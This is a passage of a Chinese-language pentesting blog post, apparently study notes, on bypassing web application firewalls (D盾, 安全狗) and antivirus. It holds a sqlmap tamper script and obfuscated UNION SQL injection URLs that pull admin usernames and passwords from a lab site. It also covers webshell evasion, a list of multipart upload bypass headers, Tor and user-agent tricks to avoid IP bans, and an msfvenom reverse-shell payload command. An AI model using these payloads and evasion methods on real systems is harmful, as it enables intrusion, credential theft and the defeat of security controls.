PRIORITY.HIGHER</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    singleTimeWarnMessage(<span class="string">&quot;tamper script &#x27;%s&#x27; is only meant to be run against %s&quot;</span> % (os.path.basename(__file__).split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>], DBMS.MYSQL))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Embraces complete query with (MySQL) zero-versioned comment</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Requirement:</span></span><br><span class="line"><span class="string">        * MySQL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Tested against:</span></span><br><span class="line"><span class="string">        * MySQL 5.0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Notes:</span></span><br><span class="line"><span class="string">        * Useful to bypass ModSecurity WAF</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; tamper(&#x27;1 AND 2&gt;1--&#x27;)</span></span><br><span class="line"><span class="string">    &#x27;1 /*!00000AND 2&gt;1*/--&#x27;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        postfix = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> comment <span class="keyword">in</span> (<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;--&#x27;</span>, <span class="string">&#x27;/*&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> comment <span class="keyword">in</span> payload:</span><br><span class="line">                postfix = payload[payload.find(comment):]</span><br><span class="line">                payload = payload[:payload.find(comment)]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27; &#x27;</span> <span class="keyword">in</span> payload:</span><br><span class="line">            retVal = <span class="string">&quot;%s /*!00000%s*/%s&quot;</span> % (payload[:payload.find(<span class="string">&#x27; &#x27;</span>)], payload[payload.find(<span class="string">&#x27; &#x27;</span>) + <span class="number">1</span>:], postfix)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>可以看到这个脚本的意思就是将 <code>1 AND 2&gt;1--</code> 经过脚本转换为：<code>1 /*!00000AND 2&gt;1*/--</code></p>
+<p>然后我们找一个比较老一点的脚本来看一看怎么转：</p>
+<p><img lazyload alt="image" data-src="image-20250207164432839.png"></p>
+<p>可以看到这个脚本就是简单加了一个内联，里面没有数字，那我们就可以全局替换，将<code>/*!</code>转换为<code>/*!44444</code> ，然后我们将这个保存为一个新的脚本：<code>safi.py</code> ，然后我们使用上面这个脚本跑一下目标脚本，这里是我们本地搭建的站点：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py -u <span class="string">&quot;http://192.168.0.200:8006/showproducts.php?id=13&quot;</span> --flush-session --tamper=safi.py  <span class="comment"># --flush-session：用来清缓存的</span></span><br></pre></td></tr></table></figure>
+<p>跑出注入类型之后就可以直接使用<code>--dbs</code>参数来爆破数据库了，可以看到爆破成功了：</p>
+<p><img lazyload alt="image" data-src="image-20250207165120017.png"></p>
+<p>然后这里我们又可以引进一个新的用来防止IP封锁的方法，那就是修改<code>sqlmap</code>工具里面的<code>options.py</code>文件，在这个文件里面将我们的ua头修改为百度的ua头，因为百度是在安全狗的白名单里面的，这样我们可以防止自己的 ip 被封锁</p>
+<h3 id="过d盾安全狗的注入语句"><a class="markdownIt-Anchor" href="#过d盾安全狗的注入语句"></a> 过D盾+安全狗的注入语句</h3>
+<p>主要方法就是：<code>/*SDJKF%26lt%3BSFDS*/</code> 代替空格过D盾，语句加入到内联注释过安全狗</p>
+<p>数据库名：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.0</span><span class="number">.200</span>:<span class="number">8006</span><span class="operator">/</span>showproducts.php?id<span class="operator">=</span><span class="number">-13</span><span class="comment">/*SDJKF%26lt%3BSFDS*/</span><span class="comment">/*!44440union*/</span><span class="comment">/*SDJKF%26lt%3BSFDS*/</span><span class="comment">/*%23*/</span><span class="keyword">distinct</span><span class="operator">%</span><span class="number">0</span>a<span class="comment">/*!44440%0aselect*/</span><span class="comment">/*SDJKF%26lt%3BSFDS*/</span><span class="number">1</span>,database<span class="operator">%</span><span class="number">23</span>(<span class="operator">%</span><span class="number">0</span>a),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 浅浅修改一下，反正思路就这样，多测试一下：</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.0</span><span class="number">.200</span>:<span class="number">8006</span><span class="operator">/</span>showproducts.php?id<span class="operator">=</span><span class="number">-13</span><span class="comment">/*SDJKF%26lt%3BSFDS*/</span><span class="comment">/*!44440union*/</span><span class="comment">/*SDJKF%26lt%3BSFDS*/</span><span class="comment">/*!44444%23*/</span><span class="operator">%</span><span class="number">0</span>a<span class="comment">/*!44440%0aselect*/</span><span class="comment">/*SDJKF%26lt%3BSFDS*/</span><span class="number">1</span>,database<span class="operator">%</span><span class="number">23</span>(<span class="operator">%</span><span class="number">0</span>a),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span></span><br></pre></td></tr></table></figure>
+<p>列表名：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.0</span><span class="number">.200</span>:<span class="number">8006</span><span class="operator">/</span>showproducts.php?id<span class="operator">=</span><span class="number">-13</span><span class="comment">/*SDJKF%26lt%3BSFDS*/</span><span class="comment">/*!44440union*/</span><span class="comment">/*SDJKF%26lt%3BSFDS*/</span><span class="comment">/*%23*/</span><span class="keyword">distinct</span><span class="operator">%</span><span class="number">0</span>a<span class="comment">/*!44440%0aselect*/</span><span class="comment">/*SDJKF%26lt%3BSFDS*/</span><span class="number">1</span>,group_concat(table_name),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span><span class="comment">/*SDJKF%26lt%3BSFDS*/</span><span class="keyword">from</span><span class="comment">/*SDJKF%26lt%3BSFDS*/</span>information_schema.tables<span class="comment">/*SDJKF%26lt%3BSFDS*/</span><span class="keyword">where</span><span class="comment">/*SDJKF%26lt%3BSFDS*/</span>table_schema<span class="operator">=</span><span class="number">0x7879636D73</span></span><br></pre></td></tr></table></figure>
+<p>列列名：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.0</span><span class="number">.200</span>:<span class="number">8006</span><span class="operator">/</span>showproducts.php?id<span class="operator">=</span><span class="number">-13</span><span class="comment">/*SDJKF%26lt%3BSFDS*/</span><span class="comment">/*!44440union*/</span><span class="comment">/*SDJKF%26lt%3BSFDS*/</span><span class="comment">/*%23*/</span><span class="keyword">distinct</span><span class="operator">%</span><span class="number">0</span>a<span class="comment">/*!44440%0aselect*/</span><span class="comment">/*SDJKF%26lt%3BSFDS*/</span><span class="number">1</span>,group_concat(column_name),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span><span class="comment">/*SDJKF%26lt%3BSFDS*/</span><span class="keyword">from</span><span class="comment">/*SDJKF%26lt%3BSFDS*/</span>information_schema.columns<span class="comment">/*SDJKF%26lt%3BSFDS*/</span><span class="keyword">where</span><span class="comment">/*SDJKF%26lt%3BSFDS*/</span>table_name<span class="operator">=</span><span class="number">0x6D616E6167655F75736572</span></span><br></pre></td></tr></table></figure>
+<p>列数据：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.0</span><span class="number">.200</span>:<span class="number">8006</span><span class="operator">/</span>showproducts.php?id<span class="operator">=</span><span class="number">-13</span><span class="comment">/*SDJKF%26lt%3BSFDS*/</span><span class="comment">/*!44440union*/</span><span class="comment">/*SDJKF%26lt%3BSFDS*/</span><span class="comment">/*%23*/</span><span class="keyword">distinct</span><span class="operator">%</span><span class="number">0</span>a<span class="comment">/*!44440%0aselect*/</span><span class="comment">/*SDJKF%26lt%3BSFDS*/</span><span class="number">1</span>,group_concat(m_name,<span class="number">0x5c</span>,m_pwd),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span><span class="comment">/*SDJKF%26lt%3BSFDS*/</span><span class="keyword">from</span><span class="comment">/*SDJKF%26lt%3BSFDS*/</span>manage_user</span><br></pre></td></tr></table></figure>
+<p>分析一下上面的语句，可以得到绕过D盾以及安全狗总体思路：<strong>注释&amp;内联注释</strong></p>
+<blockquote>
+<p>然后这里做一个简单的总结：</p>
+<p>如果服务器存在多个WAF（软件 waf），比如：D盾、安全狗、云锁、云盾、360、wts-waf 等等，首先我们需要考虑每个 waf 的绕过条件，编写脚本的时候需要注意 waf 拦截的优先级，以此来调用 bypass 脚本，然后要注意的是在多个waf tamper 联合使用的时候，要判断脚本的语句是否有冲突，如果有的话我们需要重新编写一个脚本</p>
+</blockquote>
+<p>这里再推荐一个切换代理的工具<code>Auto_Tor_IP_changer-master</code>，可以过掉硬件 waf 封锁 ip：</p>
+<p><img lazyload alt="image" data-src="image-20250207181846407.png"></p>
+<p>这个使用的是本地的 9050 端口，我们在使用sqlmap扫描的时候，可以使用 <code>--tor --proxy-type=SOCKS5</code> 来指定，这里需要安装两个软件：<code>sudo apt-get install tor provixy</code></p>
+<h3 id="菜刀拦截"><a class="markdownIt-Anchor" href="#菜刀拦截"></a> 菜刀拦截</h3>
+<p>首先我们要使用 webshell 进行连接的话，首先得把 webshell 传到目标服务器，但是在对面有软件 waf 的情况下，这些木马会被检测出来，并且会被杀掉，所以我们要先对一句话进行免杀，比如通过编码、加密、函数、可变变量、类等等来达到免杀的目的，但是很多 waf 都会拦截菜刀，比如说：360、安全狗、云锁、阿里云等等，也就是说你哪怕把一句话传上去了，使用菜刀链接的时候还是会被拦截，所以我们就需要使用特定版本的菜刀，或者对菜刀的配置文件进行修改：</p>
+<p><img lazyload alt="image" data-src="image-20250207183759550.png"></p>
+<p>然后这里再讲一个免杀的技巧：</p>
+<ul>
+<li>
+<p>首先需要将木马写入到一个 txt 文件里面（这里以 php 大马为例），然后将开头以及结尾的<code>&lt;?php</code>以及<code>?&gt;</code>去掉，然后我们再写一个<code>1.php</code>，用来引用这个写入的 txt 文件，使用<code>file_get_contents</code>函数引用这个上传的 txt 木马，当然，也可以搞一台VPS，然后将这个 txt 文件上传到我们的VPS上面，之后使用 php 文件引用</p>
+<p><img lazyload alt="image" data-src="image-20250207190356641.png"></p>
+</li>
+<li>
+<p>但是很明显，这样上传之后的文件是无法运行的，所以我们需要对文件进行修改，先修改一下<code>1.txt</code> 里面只有一个 eval 运行</p>
+<p><img lazyload alt="image" data-src="image-20250207190619860.png"></p>
+<p>然后我们需要修改<code>2.php</code>文件，上面那些 <code>define</code> 都是从<code>1.txt</code>原本的木马文件上面复制过来的</p>
+<p><img lazyload alt="image" data-src="image-20250207190721358.png"></p>
+<p><img lazyload alt="image" data-src="image-20250207190854914.png"></p>
+<p>成功运行，然后我们使用安全狗扫描，可以看到 <code>2.php</code> 并没有被检测出来，但是D盾可以扫描出来：</p>
+<p><img lazyload alt="image" data-src="image-20250207190958744.png"></p>
+</li>
+</ul>
+<h3 id="改包过-waf"><a class="markdownIt-Anchor" href="#改包过-waf"></a> 改包过 waf</h3>
+<p>下面这个是可以过安全狗的：</p>
+<p>在<code>filename</code>后面加上换行，比如这里就是在第一个双引号后面加的换行，也可以在双引号前换行，还可以点后换行加一个截断</p>
+<p><img lazyload alt="image" data-src="image-20250207195227987.png"><br>
+<img lazyload alt="image" data-src="image-20250207195517253.png"></p>
+<p>也可以交换一下<code>filename</code>和<code>name</code>的位置，然后就是可以去掉<code>from-data</code>，或者使用长度截断，多加几个垃圾字符</p>
+<p><img lazyload alt="image" data-src="image-20250207195945587.png"></p>
+<p>也可以直接把<code>content-type</code>全部删除测试一下</p>
+<p><img lazyload alt="image" data-src="image-20250207200041177.png"></p>
+<p>还有就是修改一下<code>-</code>的数量</p>
+<p><img lazyload alt="image" data-src="image-20250207200135547.png"></p>
+<p>还有就是在<code>filepath</code>后面加上一个截断（%00，然后编码），可以看到<code>a.asp</code>上传成功</p>
+<p><img lazyload alt="image" data-src="image-20250207200238628.png"></p>
+<p>也可以尝试多写几个<code>filename</code> ，然后使用分号隔开</p>
+<p><img lazyload alt="image" data-src="image-20250207200424961.png"></p>
+<p>主要还是要脑洞大开，也可以吧双引号修改为单引号，去掉双引号，等等等</p>
+<p>然后将上面的方法总结一下：</p>
+<ol>
+<li>
+<p>去掉引号</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=file_x; filename=<span class="string">&quot;xx.php&quot;</span></span><br><span class="line">Content-Disposition: form-data; name=file_x; filename=xx.php</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;file_x&quot;</span>; filename=xx.php</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>双引号变成单引号</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=<span class="string">&#x27;file_x&#x27;</span>; filename=<span class="string">&#x27;xx.php&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>单引号、双引号、不要引号，都能上传。</p>
+</li>
+<li>
+<p>大小写</p>
+<p>对这三个固定的字符串进行大小写转换：</p>
+<ul>
+<li><code>Content-Disposition</code></li>
+<li><code>name</code></li>
+<li><code>filename</code></li>
+</ul>
+<p>例如：<code>name</code> 转换成 <code>Name</code>，<code>Content-Disposition</code> 转换成 <code>content-disposition</code></p>
+</li>
+<li>
+<p>空格</p>
+<p>在 <code>:</code>，<code>;</code> 和 <code>=</code> 添加1个或者多个空格，不过测试只有 <code>filename</code> 在 <code>=</code> 前面添加空格，上传失败。</p>
+<p>在 <code>filename=</code> 后面添加空格</p>
+</li>
+<li>
+<p>去掉或修改 Content-Disposition 值</p>
+<p>有的 WAF 在解析的时候，认为 Content-Disposition 值一定是 form-data，造成绕过。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: name=<span class="string">&#x27;file_x&#x27;</span>; filename=<span class="string">&#x27;xx.php&#x27;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>交换 name 和 filename 的顺序</p>
+<p>规定Content-Disposition必须在最前面，所以只能交换name和filename的顺序。有的WAF可能会匹配name在前面，filename在后面，所以下面姿势会导致Bypass。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; filename=<span class="string">&quot;xx.php&quot;</span>; name=file_x</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>多个 boundary</p>
+<p>最后上传的文件是 <code>test.php</code> 而非 <code>test.txt</code>，但是取的文件名只取了第一个就会被Bypass。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-----------WebKitFormBoundaryj1oRYFW91eaj8Ex2------------</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;file_x&quot;</span>; filename=<span class="string">&quot;test.txt&quot;</span></span><br><span class="line">Content-Type: text/javascript</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>多个 filename</p>
+<p>最终上传成功的文件名是 <code>test.php</code>。但是由于解析文件名时，会解析到第一个。正则默认都会匹配到第一个。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;file_x&quot;</span>; filename=<span class="string">&quot;test.txt&quot;</span>; filename=<span class="string">&quot;test.php&quot;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>多个分号</p>
+<p>文件解析时，可能解析不到文件名，导致绕过。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;file_x&quot;</span>;;; filename=<span class="string">&quot;test.php&quot;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>multipart / form-DATA</p>
+<p>这种绕过应该很少，大多数都会忽略大小写。php 和 java 都支持。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: multipart/form-DATA</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>Header 在 boundary 前添加任意字符</p>
+<p>这个只能说，PHP支持。试了JAVA会报错。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: multipart/form-data; bypassboundary=----WebKitFormBoundaryj1oRYFW91eaj8Ex2</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>filename 换行</p>
+<p>PHP支持，Java不支持。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;file_x&quot;</span>; file</span><br><span class="line">name=<span class="string">&quot;test.php&quot;</span></span><br></pre></td></tr></table></figure>
+<p>下面这种 PHP 也支持。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fi</span></span><br><span class="line">lename</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>name 和 filename 添加任意字符串</p>
+<p>PHP上传成功，Java上传失败。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: name=<span class="string">&quot;file_x&quot;</span>; bypass waf upload; filename=<span class="string">&quot;test.php&quot;</span>;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<blockquote>
+<p><strong>个人之前总结的30个上传绕过姿势：</strong></p>
+<ol>
+<li>filename 在 content-type 下面</li>
+<li>.asp{80-90}</li>
+<li>NTFS ADS</li>
+<li>.asp…</li>
+<li>boundary不一致</li>
+<li>iis6 分号截断 asp.asp;asp.jpg</li>
+<li>apache 解析漏洞 php.php.ddd</li>
+<li>boundary 和 content-disposition 中间插入换行</li>
+<li>hello.php:a.jpg 然后 hello.&lt;&lt;&lt;</li>
+<li>filename=php.php</li>
+<li>filename=“a.txt”;filename=“a.php”</li>
+<li>name=\n&quot;file&quot;;filename=“a.php”</li>
+<li>content-disposition:\n</li>
+<li>.htaccess文件</li>
+<li>a.jpg\nphp</li>
+<li>去掉 content-disposition 的 form-data 字段</li>
+<li>php&lt;5.3 单双引号截断特性</li>
+<li>删掉content-disposition: form-data:</li>
+<li>content-disposition\00:</li>
+<li>{char}+content-disposition</li>
+<li>head 头的 content-type: tab</li>
+<li>head 头的 content-type: multipart/form-DATA</li>
+<li>filename 后缀改为大写</li>
+<li>head 头的 Content-Type: multipart/form-data;\n</li>
+<li>.asp空格</li>
+<li>.asp0x00.jpg 截断</li>
+<li>双 boundary</li>
+<li>file\nname=“php.php”</li>
+<li>head 头 content-type 空格:</li>
+<li>form-data 字段与 name 字段交换位置</li>
+</ol>
+</blockquote>
+<h2 id="免杀"><a class="markdownIt-Anchor" href="#免杀"></a> 免杀</h2>
+<p>之前我们了解过 MSF 的相关知识，首先我们要知道 MSF 能干什么：</p>
+<ol>
+<li>提权</li>
+<li>内网渗透</li>
+<li>维持控制</li>
+</ol>
+<p>然后我们要知道的是，在服务器上面会有很多杀软，比如说：360、火绒、nod32、卡巴斯基，我们一旦上传 payload，就会被杀软杀掉，所以我们要思考的就是如何过掉杀软，这个时候就要学习免杀</p>
+<h3 id="shellter免杀"><a class="markdownIt-Anchor" href="#shellter免杀"></a> shellter免杀</h3>
+<p>使用 shellter 工具进行免杀，可以绕过很多杀软，但要是想让功能更强的话，可以使用收费版</p>
+<h3 id="免杀-msfpayload"><a class="markdownIt-Anchor" href="#免杀-msfpayload"></a> 免杀 msfpayload</h3>
+<p>首先肯定是使用 msfvenom 生成 python 木马：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LPORT=4444 LHOST=192.168.8.124 -i 11 -f py -o msf.py</span><br></pre></td></tr></table></figure>
+<blockquote>
+<ul>
+<li><code>msfvenom</code>：这是一个用于生成各种类型的有效载荷（payload）的工具，通常与 Metasploit 框架一起使用。</li>
+<li><code>-p windows/meterpreter/reverse_tcp</code>：指定要生成的有效载荷类型。在这里，选择的是 Windows 平台的 Meterpreter 反向 TCP 连接。这意味着一旦目标机器运行了这个有效载荷，它将会尝试连接回攻击者的机器。</li>
+<li><code>LPORT=4444</code>：指定反向连接时使用的本地端口号。在这个例子中，攻击者的机器将监听 4444 端口。</li>
+<li><code>LHOST=192.168.8.124</code>：指定攻击者的主机 IP 地址，目标机器在执行有效载荷时会连接到这个地址。</li>
+<li><code>-i 11</code>：指定生成的有效载荷的编码迭代次数。这里设置为 11 次，目的是增加有效载荷的复杂性，以绕过某些安全检测。</li>
+<li><code>-f py</code>：指定输出格式为 Python 脚本。</li>
+<li><code>-o msf.py</code>：指定输出文件的名称为 <code>msf.py</code>，即生成的 Python 脚本将保存为这个文件名。</li>
+</ul>
+</blockquote>
+<p>然后就是建立监听，使用<code>multi/handler</code>脚本，之后使用其他的一些脚本对我们刚刚生成的 python 脚本再次进行编码，或者是写入一些垃圾字符，以此来绕过一些 waf 的检测</p>
+<h3 id="venom-免杀-payload"><a class="markdownIt-Anchor" href="#venom-免杀-payload"></a> venom 免杀 payload</h3>
+<p><img lazyload alt="image" data-src="image-20250208155425662.png"></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://github.com/r00t-3xp10it/venom/releases/tag/v1.0.17.7">https://github.com/r00t-3xp10it/venom/releases/tag/v1.0.17.7<i class="fas fa-external-link-alt"></i></a></p>
+<h3 id="shecodject-免杀"><a class="markdownIt-Anchor" href="#shecodject-免杀"></a> shecodject 免杀</h3>
+<p><a class="link" target="_blank" rel="noopener" href="https://github.com/TaroballzChen/shecodject">https://github.com/TaroballzChen/shecodject<i class="fas fa-external-link-alt"></i></a></p>
+<p>这个其实就是自动化生成 python 脚本然后进行免杀</p>
+<h2 id="提取过waf"><a class="markdownIt-Anchor" href="#提取过waf"></a> 提取过waf</h2>
+<ul>
+<li>通过程序读密码</li>
+<li>利用 waf 绕过神器</li>
+<li>利用 exp 读 hash</li>
+<li>将用户添加到远程桌面组，并且给目录降权</li>
+<li>sa sqlserver system</li>
+<li>直接把 waf 服务或者进程给他干掉</li>
+<li>利用第三方软件提权</li>
+</ul>
+<h2 id="补充"><a class="markdownIt-Anchor" href="#补充"></a> 补充</h2>
+<p>要是碰到杀软的话，我们其实可以尝试一些 ps 脚本，也就是 powershell 的一些脚本，也可以使用无文件攻击，msf+加载 powershell，当然也可以尝试一下 empire，这个虽然现在下载有点困难。。。但是之前了解过一点，感觉还是很靠谱的，尤其是打Windows 的时候，并且他的很多脚本啥的都是带有一定的免杀效果的，说不定就可以过掉杀软，还有就是 powersploit</p>
+<p>除此之外，我们也可以找一些源码编译使用，或者直接找免杀的程序使用，比如说：掩日、shellter、shecodject 等等</p>
+
+                    
+                </div>
+
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/%E5%85%8D%E6%9D%80/">免杀</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                            <div class="post-share-container border-box">
+    <ul class="share-list-wrap border-box">
+        <li class="qq share-item border-box flex-center tooltip"
+            data-tooltip-content="分享到 QQ"
+        >
+            <i class="fa-brands fa-qq"></i>
+        </li>
+        <li class="wechat share-item border-box flex-center tooltip tooltip-img"
+            data-tooltip-content="分享到微信"
+            data-tooltip-img-tip="微信扫一扫"
+            data-tooltip-img-style="background-color: #fff; top: -10px; padding: 0.6rem 0.6rem 0.1rem 0.6rem;"
+        >
+            <i class="fa-brands fa-weixin"></i>
+        </li>
+        <li class="weibo share-item border-box flex-center tooltip"
+            data-tooltip-content="分享到微博"
+        >
+            <i class="fa-brands fa-weibo"></i>
+        </li>
+    </ul>
+</div>
+
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2025/02/03/windows%E6%8F%90%E6%9D%83/"
+                                   title="windows提权"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">windows提权</span>
+                                        <span class="post-nav-item">下一篇</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+            <div class="pc-post-toc left-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#waf-%E9%98%B2%E6%8A%A4%E5%8E%9F%E7%90%86%E8%AE%B2%E8%A7%A3"><span class="nav-text"> WAF 防护原理讲解</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%E7%BB%95%E8%BF%87waf"><span class="nav-text"> 目录扫描绕过waf</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A6%81%E7%94%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="nav-text"> 禁用命令执行函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AE%BF%E9%97%AE%E5%8F%97%E9%99%90%E7%BB%95%E8%BF%87"><span class="nav-text"> 访问受限绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87-waf"><span class="nav-text"> 手工注入绕过 waf</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%87d%E7%9B%BE%E5%AE%89%E5%85%A8%E7%8B%97%E7%9A%84%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5"><span class="nav-text"> 过D盾+安全狗的注入语句</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8F%9C%E5%88%80%E6%8B%A6%E6%88%AA"><span class="nav-text"> 菜刀拦截</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%B9%E5%8C%85%E8%BF%87-waf"><span class="nav-text"> 改包过 waf</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%8D%E6%9D%80"><span class="nav-text"> 免杀</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#shellter%E5%85%8D%E6%9D%80"><span class="nav-text"> shellter免杀</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%8D%E6%9D%80-msfpayload"><span class="nav-text"> 免杀 msfpayload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#venom-%E5%85%8D%E6%9D%80-payload"><span class="nav-text"> venom 免杀 payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#shecodject-%E5%85%8D%E6%9D%80"><span class="nav-text"> shecodject 免杀</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8F%90%E5%8F%96%E8%BF%87waf"><span class="nav-text"> 提取过waf</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A1%A5%E5%85%85"><span class="nav-text"> 补充</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
